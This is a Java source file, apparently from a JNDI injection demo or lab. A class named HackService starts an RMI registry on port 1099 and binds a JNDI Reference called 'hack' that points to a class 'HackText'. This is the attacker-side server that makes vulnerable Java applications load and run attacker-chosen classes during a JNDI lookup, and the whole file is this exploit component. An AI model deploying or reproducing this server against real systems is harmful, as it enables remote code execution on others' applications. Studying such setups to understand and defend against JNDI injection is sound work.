package org.example.hacker;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class HackService {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        LocateRegistry.createRegistry(1099);
        Registry registry = LocateRegistry.getRegistry();

        Reference reference = new Reference(
                "org.example.hacker.HackText",
                "org.example.hacker.HackText",
                null);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("hack",referenceWrapper);
        System.out.println("服务初始化complete");
    }
}
